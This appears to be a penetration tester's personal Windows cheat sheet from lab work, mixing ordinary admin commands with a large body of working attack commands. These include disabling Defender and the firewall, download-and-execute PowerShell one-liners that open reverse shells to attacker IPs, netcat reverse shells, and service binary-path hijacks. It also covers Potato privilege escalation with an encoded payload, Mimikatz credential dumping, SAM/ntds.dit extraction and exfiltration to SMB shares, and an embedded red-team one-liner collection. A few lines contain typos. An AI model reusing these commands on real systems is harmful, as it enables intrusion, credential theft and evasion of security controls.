----------------------------------------------------autorum_commands_on_startup---------------------------------
Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run


---------------------------------------------------Bypass-Windows-authentication-password---------------------
konboot

------------------------------------------------------------MS Word-------------------------------------------
Turn off smart quotes/autocorrection:
File -> options -> Proofing
---------------------------------------------------ipconfig-----------------------------
ipconfig /flushdns

--------------------------------------------------Setting dns server----------------------------------------
netsh interface ip set dnsservers "Wi-Fi" static 1.1.1.1

-------------------------------------------------------------Crack_LM/NT_hashes----------------------------------------------
john hashes.txt --incremental #format: <user>:<Hash>

ophcrack

----------------------------------------------------------------Disable defender-------------------------------------------
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose

Computer Configuration > Administrative Templates > Windows Components > Windows Defender
Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager


Disable firewall:
netsh advfirewall set allprofiles state off

---------------------------------------------------------Defender Exclusions------------------------


----------------------------------------------Defender history-----------------------------------
C:\ProgramData\Microsoft\Windows Defender\Scans\History\

-----------------------------------------------smb/netbios---------------------------
nbtstat -n  (local)

nbstat -a <IP>

--------------------------------------------------------cmd enable colured output----------------------------------------
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1

--------------------------------------------------enviroment-variables------------------------
set
dir env:
ls env:
-----------------------------------------------systeminfo-----------------------------------
systeminfo
-----------------------------------------------list-all-drives------------------------------
wmic logicaldisk get caption,description,providername

----------------------------------------------search-files--------------------------------------

dir /s /b proof.txt

cmd /c "dir /s /b proof.txt"

where /r c:\Users user.txt

cmd /c "dir /s /b root.txt"


Get-ChildItem -Path c:\ -Filter secret.txt -Recurse -ErrorAction SilentlyContinue -Force

Get-ChildItem -Path c:\ -Filter ConsoleHost_history.txt -Recurse -ErrorAction SilentlyContinue -Force

------------------------------------------------routing table----------------------------------
route print

-----------------------------------------------wireless wifi passswords------------------------------
(netsh wlan show profiles) | Select-String "\:(.+)$"| %{$name=$_.Matches.Groups[1].Value.Trim();$_}|%{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim();$_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize

------------------------------------------------------Changing interface metric(priority of interface)----------------------------------------
get-wmiobject win32_networkadapter | select netconnectionid, name, InterfaceIndex, netconnectionstatus   (Finding interface index)
netsh interface ipv4 show interfaces (Finding interface index)
Get-NetAdapter (Finding interface index)

Set-NetIPInterface -InterfaceIndex 12 -InterfaceMetric 15   (changing the interface metric)


------------------------------------------------Get-Help---------------------------------------------
Get-Help <cmdlet_name>
Get-Help Get-Help -Full
Get-Help Get-Help -Examples
Update-Help

-----------------------------------------------Get-Command-------------------------------------------
finding path/which alternative command:
get-command powershell | select-object Definition
get-command ipconfig | select *

list all cmdlets:
Get-Command -CommandType cmdlet

------------------------------importing module---------------------------------------------
import-module .\PowerView.ps1

.dll format:
Import-Module ([System.Reflection.Assembly]::Load((Invoke-WebRequest -Uri "http://192.0.0.3/Microsoft.ActiveDirectory.Management.dll").content))

.psm1 format:
New-Module -Name "Your Module Name" -ScriptBlock ([Scriptblock]::Create((New-Object System.Net.WebClient).DownloadString("Your Module URL")))

Listing all commands in a module:
Get-Command -module <module_name>


-------------------------------------------Execution-Policy---------------------------------
powershell -ExecutionPolicy bypass
powershell -c <cmd>
powershell -encodedcommand
$env:PSExecutionPolicy
Set-ExecutionPolicy -Scope CurrentUser bypass
-------------------------------------------running scripts-----------------------------
iex(New-Object Net.WebClient).DownloadString('<URL>')

$ie=New-Object -ComObject InternetExplorer.application;$ie.visible=$False;$ie.navigate('<URL>');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response

iex(iwr '<URL>')

$h=New-Object -ComObject Msxm12.XMLHTTP;$h.open('GET','<URL>',$false);$h.send();iex $h.responseText

$wr=[system.NET.webRequest]::Create("http://192.168.230.1/evil.ps1");$r=$wr.GetResponse();iex ([System.IO.Streamreader]($r.GetresponseStream())).ReadyToEnd()

C:\PSTools>dir C:\PSTools\ps*
C:\>dir C:\PSTools\ps*.exe

type seeme.txt
notepad.exe seeme.txt:hidden.txt
dir /?
dir /R

snow -C -m "Hidden Message" -p "password" snow.txt snow2.txt
snow -C -p "password" snow2.txt

------------------------------------------------list ports/services listening---------------------------------------
netstat -ana
netstat -ana | findstr 127.0.0.1
netstat -ano
netstat -anob
netstat -anop tcp | findstr 4444

Get-Process -Id (Get-NetTCPConnection -LocalPort YourPortNumberHere).OwningProcess

powershell -Command "Start-Process cmd -Verb RunAs" #open cmd with admin privelliges
Start-Process powershell -Verb runAs

Get-NetTcpConnection | Where-Object {$_.State -eq "Listen"}

---------------------------------------------------------winrm/winrs-----------------------------------------------------


-----------------------------------------------Port forwarding--------------------------------------
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.67"


----------------------------------------------run exe in background---------------------------------
Start-Job {powershell.exe -windowstyle hidden -nop -ExecutionPolicy bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://10.10.14.2/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 53"}

Start-Job {powershell.exe -nop -ExecutionPolicy bypass -c "iex((New-Object Net.WebClient).DownloadString('http://192.168.119.156/Invoke-PowerShellTcp2.ps1'))"}

Start-Job {C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -nop -ExecutionPolicy bypass -c "iex((New-Object Net.WebClient).DownloadString('http://192.168.119.156/Invoke-PowerShellTcp2.ps1'))"}


Start-Process "C:\Windows\Temp\shell_x86_rev_3333.exe" -WindowStyle Hidden   (Start process in background)

START /B program

--------------------------------------------------------------Services-------------------------------------------------
Query the configuration of a service:
> sc.exe qc <name>
Query the current status of a service:
> sc.exe query <name>
Modify a configuration option of a service:
> sc.exe config <name> <option>= <value>
Start/Stop a service:
> net start/stop <name>

Change binary path:
sc config upnphost binpath= "C:\windows\temp\nc.exe -nv 192.168.119.156 443 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost binpath= 'cmd /C "net localgroup administrators tech\studentuser /add"'

-----------------------------------------------------------Group Policy----------------------------------------------
# Writable access to removable drives
Local Computer Policy --> Computer Configuration --> Administrative Templates --> System --> Removable Storage Access

------------------------------------------------------accesschk-------------------------------------------------------
accesschk.exe /accepteula -ucqv *

accesschk.exe /accepteula (always do this first!!!!!)
accesschk.exe /accepteula -ucqv [service_name] (requires sysinternals accesschk!)
accesschk.exe /accepteula -uwcqv "Authenticated Users" * (won't yield anything on Win 8)
accesschk.exe /accepteula -ucqv [service_name]

// Find all weak folder permissions per drive.
accesschk.exe /accepteula -uwdqs Users c:\
accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\

// Find all weak file permissions per drive.
accesschk.exe /accepteula -uwqs Users c:\*.*
accesschk.exe /accepteula -uwqs "Authenticated Users" c:\*.*

Folder permissions:
.\accesschk.exe /accepteula -uwdq C:\backup\Scripts\lollz\

File permissions:
.\accesschk -uwqs "Authenticated Users" c:\backup\Scripts\*.*

----------------------------------------------------------check enabled services---------------------------------------------
net start

wmic service where 'Caption like "Remote%" and started=true' get Caption

------------------------------------------------------------------net command-------------------------------------------
Local user:
net user <user_name>

Domain user info:
net user <user_name> /domain


Local users:
net users

Domain users:
net users /domain


Domain groups:
net group /domain
---------------------------------------------------------------Add user AD----------------------------------------
$password==ConvertTo-SecureString 'Testertest@123' -AsPlainText -Force
New-ADUser -Name $line -PasswordNeverExpires $true -SamAccountName $line -UserPrincipalName $line -AccountPassword $password -Enabled $true

----------------------------------------------------------------add user as admin--------------------------------------------
1.net user /add test Te$terte$t@123
2.net localgroup administrators testertest /add

# removing/deleting dimain user from domain group
net group "Domain Admins" "student567" /domain /delete

-------------------------------------------------------------Enable administrator account windows-----------------------------
windows+r --> lusrmgr.msc

-------------------------------------------------------------check local administrators------------------------------------------------------------
net localgroup administrators


---------------------------------------------------------------netcat reverse shell----------------------------------------------
z:\nc64.exe -e powershell 192.0.07 53



------------------------------------------------------------list groups------------------------------------------------------------------
net localgroup

net localgroup "Remote Desktop Users" (list members of group)

---------------------------------------------------------------change password of windows user---------------------------------------------
Local User:
net user <username> <password>
net user Administrator Te$terte$t@123

Change password of Domain user:
NET USER <username> <password> /domain
net user administrator testertest@123 /domain
---------------------------------------------------------------check running ad administrator----------------------------------------------------
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
$currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

#One liner
(New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

whoami /priv
whoami /all /fo list

-------------------------------------------------------------------------copy/transfer files like wget------------------------------------
iwr -uri http://10.10.15.107:8080/winPEAS.exe -outfile winpeas.exe
Invoke-WebRequest http://10.10.14.2:8080/winPEASx64.exe -OutFile winPEASx64.exe

certutil.exe -urlcache -split -f http://10.1.1.246:445/nc64.exe nc64.exe

impacket-smbserver apnashare $(pwd)
net use z: \\10.10.14.3\apnashare 

Transferrring file to dcorp-mgmt:
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe

------------------------------------------------------Copy/replace files--------------------------------------
cmd /c "COPY /Y C:\Users\xavier\enterprisesystemmanager.exe C:\exacqVisionEsm\EnterpriseSystemManager\enterprisesystemmanager.exe"

----------------------------------------------------mount-shared-folders--------------------------------------------
add
vmhgfs-fuse /mnt/hgfs fuse defaults,allow_other 0 0

to /etc/fstab

Then reboot, or sudo mount -a

--------------------------------------------------------LLMNR poisoning Responder------------------------------------------
responder -I eth0 -rdwv
hashcat -m 5600 ntlmhash.txt /mnt/hgfs/D/wordlists/rockyou.txt --force

---------------------------------------------------------scf file (@firmware.scf)--------------------------------------------
[Shell]
Command=2
IconFile=\\10.10.14.176\apnashare\icon.ico
[Taskbar]
Command=ToggleDesktop


---------------------------------------------------------32bitpowershell-----------------------------------
C:\Windows\SysWOW64\WindowsPowerShell\v1.0

--------------------------------------------------------64bit_powershell------------------------------
C:\Windows\System32\WindowsPowerShell\v1.0

--------------------------------------------------------Determine-Powerhsell Architechture-----------------
 [Environment]::Is64bitProcess
 
-------------------------------------------------------secretsdump.py-----------------------------------------


---------------------------------grep altenative--------------------
adb shell pm list packages | findstr "insurance"


-------------------------------------------------------------recursively view files and folders----------------------------------

Get-ChildItem -recurse .

dir /s

gci -recurse . | select-Object fullname

gci -recurse . | select-Object fullname | findstr user.txt

Find string in files recursively:
Get-ChildItem -Recurse | Select-String "james" -List | Select Path

---------------------------------------------------------------switch to SYSTEM shell from admin user---------------------------------------
.\PsExec64.exe -accepteula -s C:\PrivEsc\reverse.exe

.\PsExec64.exe -accepteula -i -s "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"

.\PsExec64.exe -sid "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"

HKCU\Software\Sysinternals\PsExec\EulaAccepted

-----------------------------------------watch command --------------------------------------
while (1) {date; sleep 1}

----------------------------------------------------------su to other user within shell (switching to other user)---------------------------------------------

$pass=ConvertTo-SecureString 'Zx^#QZX+T!123' -AsPlainText -Force
$cred=New-Object System.Management.Automation.PSCredential ("batman", $pass)
Invoke-Command -Computer ARKHAM -ScriptBlock { whoami } -Credential $cred

--------------------------------------------------------------Decrypting XML password----------------------------------------
$credential = Import-CliXml -Path .\user.txt
$credential.GetNetworkCredential().Password

---------------------------------------------------------UAC bypass/ mount smb share-------------------------------------------------------------
net use z: \\192.168.119.156\apnashare /user:test testertest123

net use Z: \\127.0.0.1\c$

cd z:

--------------------------------------------------------------Compress-archive---------------------------------
Compress-Archive -LiteralPath C:\users\lars\Documents\wcf -DestinationPath C:\users\lars\Documents\wcf.zip

-----------------------------------------------------------checking directory permissions-------------------
icacls c:\windows\temp

Get-Acl <dir/file> |  Format-List *

-------------------------------------------------------------chmod(cacls)-------------------------------
cacls root.txt /t /e /p Alfred:F


------------------------------------------------------current directory---------------------------
explorer %cd%

-----------------------------------------------wsl linux dir location----------------------------
%USERPROFILE%\AppData\Local\Packages

#Does not works with root
explorer.exe .

# Enable WSL
sc.exe config LxssManager start=auto
sc.exe start LxssManager


------------------------------------LxssManager----------------------------------
sc config LxssManager start=auto

---------------------------------------------------------null session----------------------------------
net use \\192.168.99.162\IPC$ "" /u:""

----------------------------------------------------------windows b64 convert------------------------------------

[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($s))



------------------------------------------------------------Connect to smb share------------------------------------------

$pass=ConvertTo-SecureString 'smb_password' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PsCredential("<user_name>",$pass)
New-PSDrive -Name apnasmb -PSProvider FileSystem -Credential $cred -Root \\<ip>\<share>

---------------------------------------------------------------finding current domain---------------------------------------------
$ADclass=[System.Directoryservices.activeDirectory.Domain]
$ADclass::GetCurrentDomain()

----------------------------------------------------------------Finding Domain Controller---------------------------
ipconfig /displaydns
powershell "IEX (New-Object Net.WebClient).DownloadString('http://175.13.80.16:8000/PowerView.ps1'); Get-NetDomainController"
powershell "IEX (New-Object Net.WebClient).DownloadString('http://175.13.80.16:8000/PowerView.ps1'); Get-NetDomainController"


SRV records:
nslookup -querytype=SRV _LDAP._TCP.DC._MSDCS.<doamin_name>

DC discovery:
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers

Finding workgroups and domains on the network:
net view /domain

Listing computers/members of domain and workgroups:
net view /domain:<domain_name>

nbtstat -A

--------------------------------------------------------Bloodhound-----------------------------------------
runas /netonly /user:active.htb\SVC_TGS powershell(Running sharphound via remote pc using a pwned domain user)

runas /user:<user> powershell

-----------------------------------------------------Enable RDP-------------------------------------------

Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0

Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

netsh advfirewall firewall add rule name="allow RemoteDesktop" dir=in protocol=TCP localport=3389 action=allow

--------------------------------------------------------Add user to rdp group--------------------------
net localgroup "Remote Desktop Users" evil_user /add 

------------------------------------------------Powershell--------------------------------------------
Get-ChildItem -Hidden -Directory -Filter '*3*' 

To get the exact position of a string within the file, you can use the following command:  
(Get-Content -Path file.txt)[index] 
Get-Content .\1.txt | Select-Object -Index 551


Check Alternate data streams:
$files = gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$Data' | select filename,stream,@{'name'='identifier';"e"={"$($_.filename)$($_.stream)"}}; write-output $files

Get-Item -Path file.exe -Stream * 

dir /r


Read Alternate data streams:
Get-Content .\hm.txt -Stream root.txt

The command to run to launch the hidden executable hiding within ADS: 
wmic process call create $(Resolve-Path file.exe:streamname)


----------------------------------------------------------------World writable windows directories---------------------------------
\windows\system32\spool\drivers\color\cute.exe (we can send nc64 to it)

c:\windows\temp

SYSVOL

-------------------------------------------------------wbadmin(backup & restore)------------------------------------------
echo Y | wbadmin start backup -include:C:\Windows\NTDS\ntds.dit -backuptarget:\\10.10.14.5\myshare

wbadmin get versions

echo Y | wbadmin start recovery -version:12/28/2020-10:40 -itemType:file -items:C:\windows\ntds\ntds.dit -BackupTarget:\\10.10.14.5\myshare -recoverytarget:c:\ -notrestoreacl

reg Fimoacket hklm\system system.save

---------------------------------------------------------------system file to crack ntds.dit------------------------
reg save hklm\system z:\system

reg save hklm\sam z:\sam

------------------------------------------------------Powershell creating registry keys---------------------------------------------------------------
New-Item -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\" -Name Explorer
New-ItemProperty -Path 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Explorer' -Name DisableSearchBoxSuggestions -Value 1  -PropertyType DWORD -Force

---------------------------------------------------------------Powershell ping sweep-------------------------------------
1..255 | % {"192.168.1.$($_): $(Test-Connection -count 1 -comp 192.168.1.$($_) -quiet)"}

1..255 | % {echo "192.168.1.$_"; ping -n 1 -w 100 192.168.1.$_} | Select-String ttl

workflow ParallelSweep { foreach -parallel -throttlelimit 4 ($i in 1..255) {ping -n 1 -w 100 10.100.11.$i}}; ParallelSweep | Select-String ttl

-InformationLevel Quiet -WA SilentlyContinue -EA SilentlyContinue

---------------------------------------------------Powershell TCP connect portscan------------------------
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("172.16.5.66",$_)) "Port $_ is open!"} 2>$null

1..20 | % { $a = $_; write-host "------"; write-host "10.0.0.$a"; 22,53,80,445 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.$a",$_)) "Port $_ is open!"} 2>$null}


----------------------------------------------------------potato exploits------------------------------------------------
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c powershell.exe -exec bypass -enc <powershell base64 encoded  payload>" -t * -c '{e60687f7-01a1-40aa-86ac-db1cbf673334}'

.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c powershell.exe -exec bypass -enc aQBlAHgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAyAC4AcABzADEAJwApACkA" -t * -c '{e60687f7-01a1-40aa-86ac-db1cbf673334}'


-c "{4991d34b-80a1-4291-83b6-3328366b9097}"

-c '{e60687f7-01a1-40aa-86ac-db1cbf673334}'

More: https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md


./socat64 tcp-listen:135,reuseaddr,fork tcp:10.1.1.68:9999
.\RoguePotato.exe -r 10.1.1.246 -e "cmd.exe /c C:\Users\steph\nc64.exe 10.1.1.246 445 -e powershell" -l 9999


-------------------------------------------------------Mimikatz---------------------------------------------------------
We can also look for credentials from the credentials vault. Interesting credentials like those used for 
scheduled tasks are stored in the credential vault. Use the below command:

Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'


-----------------------------------------------------kill process----------------------------------
FOR /L %N IN () DO taskkill /F /IM "fppsvc.exe"

-------------------------------------------------------Command execution via Windows management instrumentation(WMI)-------------------------------
$command1 = "ipconfig/all > C:\Windows\Temp\result.txt"
$cmd1 = "CMD.EXE /c "+$command
Invoke-WmiMethod -class Win32_process -name Create -ArgumentList $cmd -ComputerName "dcorp-dc"
$file= [convert]::ToBase64String((Get-Content -path "C:\Windows\Temp\result.txt" -Encoding byte))
Invoke-WebRequest http://172.16.100.67/+$file


Invoke-WmiMethod -class Win32_process -name Create -ArgumentList 'powershell iex (iwr -UseBasicParsing http://172.16.10.1/Invoke-PowerShellTcp.ps1)' -ComputerName "mcorp-dc"

-------------------------------------------------------RedTeam_CheatSheet.ps1--------------------------------------------
# Description: 
#    Collection of PowerShell one-liners for red teamers and penetration testers to use at various stages of testing.

# convert reverseshell to meterpreter
use unicorn
use web delivery module

# convert noninterative cmd reverse shell to powershell
fllmn "iex ((New-Object Net.WebClient).DownloadString('http://[your attacking machine's IP address]:[port1]/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress [your attacking machine's IP address] -Port [port2]"

powershell.exe -nop -ExecutionPolicy bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://10.10.14.3:8000/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 53"

iex((New-Object Net.WebClient).DownloadString('http://192.168.119.156/Invoke-PowerShellTcp2.ps1'))

powershell.exe -nop -exec bypass -c iex((New-Object Net.WebClient).DownloadString('http://10.2.2.218:21/IP.ps1'))


# Invoke-BypassUAC and start PowerShell prompt as Administrator [Or replace to run any other command]
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'"

# Invoke-Mimikatz: Dump credentials from memory
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"

# Import Mimikatz Module to run further commands
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"

# Invoke-MassMimikatz: Use to dump creds on remote host [replace $env:computername with target server name(s)]
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1');'$env:COMPUTERNAME'|Invoke-MassMimikatz -Verbose"

# PowerUp: Privilege escalation checks
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.2:8000/PowerUp.ps1');Invoke-AllChecks"

# Invoke-Inveigh and log output to file
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y –NBNS Y –mDNS Y  –Proxy Y -LogOutput Y -FileOutput Y"

# Invoke-Kerberoast and provide Hashcat compatible hashes
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.7/Invoke-Kerberoast.ps1');Invoke-kerberoast -OutputFormat Hashcat"

# Invoke-ShareFinder and print output to file
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1');Invoke-ShareFinder -CheckShareAccess|Out-File -FilePath sharefinder.txt"

# Import PowerView Module to run further commands
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')"

# Invoke-Bloodhound
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('http://10.10.14.7/SharpHound.ps1');Invoke-BloodHound -CollectionMethod All"

# Find GPP Passwords in SYSVOL
findstr /S cpassword $env:logonserver\sysvol\*.xml
findstr /S cpassword %logonserver%\sysvol\*.xml (cmd.exe)

# Run Powershell prompt as a different user, without loading profile to the machine [replace DOMAIN and USER]
runas /user:DOMAIN\USER /noprofile powershell.exe

# Insert reg key to enable Wdigest on newer versions of Windows
reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1


.WSF WSCipt
<job>
    <script language="VBScript">
        MsgBox "I am VBScript!"
    </script>
    <script language="JScript">
        WSH.echo("I am JScript!")
    </script>
    <script language="Python">
        import os
        os.system("cmd.exe /c calc")
    </script>
</job>